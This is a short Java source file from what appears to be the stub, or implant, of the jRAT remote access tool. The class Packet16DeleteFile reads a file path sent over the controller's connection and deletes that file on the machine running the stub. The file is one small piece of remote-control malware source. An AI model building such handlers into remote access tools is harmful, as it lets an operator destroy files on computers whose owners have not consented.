package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import java.io.File;


public class Packet16DeleteFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}

	}

}
